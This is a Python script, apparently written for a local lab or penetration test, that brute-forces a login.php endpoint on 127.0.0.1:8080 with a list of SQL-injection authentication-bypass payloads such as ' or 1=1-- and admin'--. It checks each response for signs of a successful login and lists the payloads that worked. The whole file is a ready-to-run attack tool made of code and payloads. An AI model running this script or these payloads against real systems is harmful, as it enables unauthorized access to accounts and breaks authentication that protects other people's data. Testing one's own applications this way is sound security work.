#!/usr/bin/env python3
"""
Test SQL injection on /login.php endpoint for authentication bypass
Try various payloads to bypass login authentication
"""
import requests

url = "http://127.0.0.1:8080/login.php"

# Authentication bypass payloads
payloads = [
    # Basic bypass attempts
    ("admin'", "anything"),
    ('admin"', 'anything'),
    ("admin'--", "anything"),
    ('admin"--', 'anything'),
    ("admin'#", "anything"),
    ("admin' OR '1'='1", "anything"),
    ("admin'||'1'='1", "anything"),
    # Common bypass patterns
    ("' or 1=1--", "anything"),
    ('" or 1=1--', 'anything'),
    ("' or '1'='1'--", "anything"),
    ("' or 1=1#", "anything"),
    ('" or "1"="1"--', 'anything'),
    ("' OR 1=1 LIMIT 1--", "anything"),
    # Comment variations
    ("admin'/*", "anything"),
    ("admin'--+-", "anything"),
    ("admin';--", "anything"),
    # Blind attempts
    ("admin", ""),
    ("admin", "'"),
    ("admin", "'--"),
    # Username variations
    ("' OR 1=1 --", "anything"),
    ('" OR "x"="x"', 'anything'),
    # Alternative encodings
    ("admin' OR 1=1#", "anything"),
]

results = []

for username, password in payloads:
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=10)
        # Check for success indicators
        is_success = "welcome" in response.text.lower() or "logout" in response.text.lower() or "dashboard" in response.text.lower() or "/admin" in response.text.lower() or response.status_code == 302
        results.append({
            "username": username[:30],
            "password": password,
            "status": response.status_code,
            "length": len(response.text),
            "success": is_success,
            "snippet": response.text[:200]
        })
    except Exception as e:
        results.append({
            "username": username[:30],
            "password": password,
            "error": str(e)
        })

# Print results
print("=" * 100)
print("SQL Injection Authentication Bypass Tests for /login.php")
print("=" * 100)
for r in results:
    if "error" in r:
        print(f"[ERROR] User: {r['username']}: {r['error']}")
    else:
        status = "SUCCESS!" if r['success'] else "FAILED"
        print(f"[{status}] User: {r['username']:35} Pass: {r['password']:15} | Len: {r['length']}")
        print(f"        Snippet: {r['snippet'][:100]}")
        print("-" * 100)

print("\n" + "=" * 100)
print("SUMMARY:")
print("=" * 100)
success_count = sum(1 for r in results if r.get('success'))
print(f"Total payloads tested: {len(payloads)}")
print(f"Potential successes: {success_count}")

if success_count > 0:
    print("\nWorking payloads:")
    for r in results:
        if r.get('success'):
            print(f"  - Username: {r['username']}, Password: {r['password']}")

